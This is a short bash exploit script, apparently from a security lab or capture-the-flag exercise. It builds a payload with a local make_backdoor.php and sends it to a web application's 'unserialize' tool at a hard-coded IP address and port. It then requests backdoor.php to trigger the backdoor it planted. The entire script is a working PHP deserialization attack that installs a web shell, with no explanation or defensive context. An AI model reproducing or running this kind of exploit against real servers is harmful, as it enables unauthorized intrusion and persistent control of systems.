#!/bin/bash

URL=141.85.224.105:8004
backdoor_payload=$(php ./make_backdoor.php)
curl "$URL/?tool=unserialize&input=$backdoor_payload&submit=Submit" > /dev/null
curl "$URL""/backdoor.php"
